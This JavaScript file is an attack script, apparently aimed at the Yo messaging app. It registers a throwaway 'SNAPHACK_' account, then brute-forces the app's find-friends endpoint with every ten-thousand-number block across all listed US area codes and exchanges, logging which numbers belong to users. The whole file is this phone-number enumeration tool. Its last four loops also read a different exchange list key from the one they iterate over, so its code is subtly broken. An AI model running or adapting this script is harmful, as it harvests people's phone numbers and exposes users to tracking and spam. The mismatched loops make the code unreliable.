var yoplait = require('yoplait');
var list = require('./exchanges.json');
var codes = require('./areacodes.json');
var format = require('string-format-js');
var sleep = require('sleep');
var fs = require("fs");
var util = require('util');
var udid = yoplait.genUdid()
  , username = 'SNAPHACK_' + Date.now();

console.log('signing up \'' + username + '\' with udid ' + udid)
yoplait.signUp(username, udid, udid, function(err, yo) {
  if (err) {
    return console.log('sign up failed!: ', err)
  }

console.log('%04d'.format(1));

for(var area in codes['areacodes']){
  for(var ex in list['1']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['1'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['2']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['2'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['3']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['3'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['4']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['4'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['5']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['5'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['6']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['6'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['7']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['7'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['8']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['8'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['9']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['9'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['10']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['10'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['11']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['12'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['13']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['14'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['15']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['16'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
  for(var area in codes['areacodes']){
  for(var ex in list['17']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['18'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
          }
      })
    }
  }
});